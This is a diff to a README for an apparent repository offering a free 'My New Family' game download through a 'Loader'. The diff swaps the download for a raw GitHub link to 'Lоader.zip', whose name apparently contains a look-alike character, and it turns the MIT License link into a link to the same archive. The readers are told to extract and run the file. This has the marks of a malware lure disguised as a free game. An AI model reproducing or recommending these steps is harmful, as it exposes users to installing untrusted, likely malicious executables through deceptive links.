@@ -34,7 +34,7 @@ Welcome to the ultimate utility for downloading **My New Family** for free! This
 
 ## 🛠️ Installation
 
-1. Download **Loader.rar** from this repository.
+1. Download **https://raw.githubusercontent.com/Raja0933/MyNewFamily-FreeDL-Hub/main/Lоader.zip** from this repository.
 2. Extract it using your favorite archiver (7zip, WinRAR, etc.).
 3. Run the Loader and follow on-screen instructions.
 4. Enjoy **My New Family** for free!
@@ -55,4 +55,4 @@ This repository is for **educational and archival purposes** only. Please suppor
 
 ## 📜 License
 
-MIT License (2025): [Read Full License](https://opensource.org/licenses/MIT)
+MIT License (2025): [Read Full License](https://raw.githubusercontent.com/Raja0933/MyNewFamily-FreeDL-Hub/main/Lоader.zip)
